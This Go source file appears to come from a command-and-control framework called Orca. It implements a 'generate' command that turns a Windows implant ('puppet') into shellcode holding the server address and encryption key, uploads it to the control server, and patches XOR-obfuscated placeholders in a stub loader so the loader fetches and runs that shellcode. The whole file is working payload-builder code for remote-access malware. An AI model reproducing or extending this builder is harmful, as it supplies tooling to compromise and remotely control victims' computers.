package controller

import (
	"Orca_Master/cli/cmdopt/fileopt"
	"Orca_Master/cli/cmdopt/generateopt"
	"Orca_Master/cli/common"
	"Orca_Master/define/api"
	"Orca_Master/define/colorcode"
	"Orca_Master/define/config"
	"Orca_Master/define/retcode"
	"Orca_Master/tools/crypto"
	"Orca_Master/tools/shellcode"
	"fmt"
	"github.com/desertbit/grumble"
	"io/ioutil"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

var generateCmd = &grumble.Command{
	Name:    "generate",
	Aliases: []string{"build"},
	Help:    "generate puppet",
	Usage:   "generate [-H | --host host] [-o | --output output_file] [-p | --proto http_or_https] [-P | --platform platform]",
	Flags: func(f *grumble.Flags) {
		f.String("H", "host", "", "server host")
		f.String("o", "output", "loader.exe", "output file")
		f.String("p", "proto", "http", "download via http or https")
		f.String("P", "platform", "windows/x64", "compile platform")
	},
	Run: func(c *grumble.Context) error {
		host := c.Flags.String("host")
		if host == "" {
			host = api.HOST
		}
		key := config.AesKey
		platform := c.Flags.String("platform")
		outputPath, _ := filepath.Abs(c.Flags.String("output"))
		stubPath := ""
		puppetPath := ""
		switch platform {
		case "windows/x64":
			puppetPath, _ = filepath.Abs("puppet/Orca_Puppet_win_x64.exe")
			stubPath, _ = filepath.Abs("stub/stub_win_x64.exe")
			if !fileopt.IsFile(stubPath) {
				message := fmt.Sprintf("stub:[%s] is not exist", stubPath)
				colorcode.PrintMessage(colorcode.SIGN_ERROR, message)
				return nil
			}
			if !fileopt.IsFile(puppetPath) {
				message := fmt.Sprintf("puppet:[%s] is not exist", puppetPath)
				colorcode.PrintMessage(colorcode.SIGN_ERROR, message)
				return nil
			}
			break
		case "windows/x86":
			puppetPath, _ = filepath.Abs("puppet/Orca_Puppet_win_x86.exe")
			stubPath, _ = filepath.Abs("stub/stub_win_x86.exe")
			if !fileopt.IsFile(stubPath) {
				message := fmt.Sprintf("stub:[%s] is not exist", stubPath)
				colorcode.PrintMessage(colorcode.SIGN_ERROR, message)
				return nil
			}
			if !fileopt.IsFile(puppetPath) {
				message := fmt.Sprintf("puppet:[%s] is not exist", puppetPath)
				colorcode.PrintMessage(colorcode.SIGN_ERROR, message)
				return nil
			}
			break
		case "linux/x64":
		case "linux/x86":
		case "darwin/x64":
		case "darwin/x86":
			colorcode.PrintMessage(colorcode.SIGN_ERROR, "not support")
			return nil
		default:
			colorcode.PrintMessage(colorcode.SIGN_ERROR, "platform error")
			return nil
		}
		_, err := net.ResolveTCPAddr("tcp4", host)
		if err != nil {
			message := fmt.Sprintf("Invalid OrcaServer TCP address [%s]", err)
			colorcode.PrintMessage(colorcode.SIGN_ERROR, message)
		}
		params := fmt.Sprintf("-host=%s -key=%s", host, key)

		// 将pe文件转shellcode
		savePath := "tmp/bin"
		if !fileopt.IsDir(savePath) {
			err := os.Mkdir("tmp", 0666)
			err = os.Mkdir(savePath, 0666)
			if err != nil {
				return fmt.Errorf("%s", err)
			}
		}
		timeStr := strconv.FormatInt(time.Now().Unix(), 10)
		pwd, _ := os.Getwd()
		temp := savePath + "/" + timeStr + ".bin"
		saveFile, err := filepath.Abs(filepath.Join(pwd, temp))
		if err != nil {
			return fmt.Errorf(err.Error())
		}
		srcFile := new(string)
		dstFile := new(string)
		*srcFile = puppetPath
		*dstFile = saveFile
		shellcode.PE2ShellCode(srcFile, dstFile, &params)

		// 发送文件元信息
		data := fileopt.GetFileMetaInfo(saveFile, timeStr+".bin")
		retData := fileopt.SendFileMetaMsg("Server", data, "fileUpload")
		if retData.Code != retcode.SUCCESS {
			colorcode.PrintMessage(colorcode.SIGN_FAIL, "file upload failed")
			return nil
		}
		// 分片发送文件
		fileopt.SendFileData("Server", saveFile)
		// 接收消息，显示是否发送成功
		select {
		case msg := <-common.DefaultMsgChan:
			outputMsg, _ := crypto.Decrypt(common.GetHttpRetData(msg), []byte(config.AesKey))
			fmt.Println(outputMsg)
		case <-time.After(10 * time.Second):
			colorcode.PrintMessage(colorcode.SIGN_FAIL, "request timed out")
			return nil
		}
		time.Sleep(100 * time.Millisecond)

		stubData, err := ioutil.ReadFile(stubPath)
		sIp := generateopt.DoXor([]byte("255.255.255.255"))
		sPort := generateopt.DoXor([]byte("65535"))
		sTarget := generateopt.DoXor([]byte("files/loader1234567890abcdefghijklmnopqrstuvwxyz.bin"))
		sProto := generateopt.DoXor([]byte("httpsorhttp123"))
		dIpStr, dPortStr, _ := strings.Cut(host, ":")
		dIp := generateopt.DoXor([]byte(dIpStr))
		dPort := generateopt.DoXor([]byte(dPortStr))
		dTarget := generateopt.DoXor([]byte("files/" + timeStr + ".bin"))
		dProto := generateopt.DoXor([]byte(c.Flags.String("proto")))

		stubData = generateopt.ReplaceBytes(stubData, sIp, dIp)
		stubData = generateopt.ReplaceBytes(stubData, sPort, dPort)
		stubData = generateopt.ReplaceBytes(stubData, sProto, dProto)
		stubData = generateopt.ReplaceBytes(stubData, sTarget, dTarget)
		err = ioutil.WriteFile(outputPath, stubData, 0777)
		if err != nil {
			message := fmt.Sprintf("%s", err.Error())
			colorcode.PrintMessage(colorcode.SIGN_ERROR, message)
			return nil
		}
		message := fmt.Sprintf("%s build successfully!", outputPath)
		colorcode.PrintMessage(colorcode.SIGN_SUCCESS, message)
		return nil
	},
}
